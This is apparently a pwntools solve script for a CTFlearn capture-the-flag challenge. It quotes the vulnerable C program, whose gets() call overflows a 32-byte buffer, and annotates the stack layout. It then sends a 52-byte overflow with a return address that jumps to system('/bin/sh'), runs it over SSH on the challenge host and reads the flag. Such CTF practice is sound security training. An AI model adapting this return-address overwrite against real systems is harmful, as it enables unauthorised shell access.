from pwn import *
'''
https://ctflearn.com/challenge/391
//Source:
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int vuln() {
    char buf[32];
    printf("Enter your favorite color: ");
    gets(buf);/*other code*/
    return 0;
}
int main(char argc, char** argv) {
    setresuid(getegid(), getegid(), getegid());
    setresgid(getegid(), getegid(), getegid());
    //disable buffering.
    setbuf(stdout, NULL);
    if (vuln()) {
        puts("Me too! That's my favorite color too!");
        puts("You get a shell! Flag is in flag.txt");
    //We need to jump to here to get a shell by writing over the stack
    /* 0x0804864e <+111>:    call   0x804858b <vuln>
   0x08048653 <+116>:    test   %eax,%eax
   This is the if condition
==>0x08048655 <+118>:    je     0x8048689 <main+170>
   Line inside the if condition
   0x08048657 <+120>:    sub    $0xc,%esp*/
====>  system("/bin/sh");
    } else {
        puts("Boo... I hate that color! :(");
    }
}
STACK:
====================================
          buf[32]+16 bytes=48 bytes
                    ebp    =4 bytes
    return address: ebp+4
====================================
'''
def main():
    buf = 'A'*52 + '\x57\x86\x04\x08'
    s = ssh(host='104.131.79.111', user='color', password='guest', port=1001)
    sh = s.run('(python -c \'print(\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\x57\\x86\\x04\\x08\")\' ; cat ) | ./color')
    #s.download_file('/home/color/color')
    print(sh.recvline(timeout=5))
    print(sh.recvline(timeout=5))
    sh.sendline('cat flag.txt')
    log.info('Flag is: '+sh.recvline(timeout=5).decode('utf-8'))
    sh.close()
    s.close()
main()
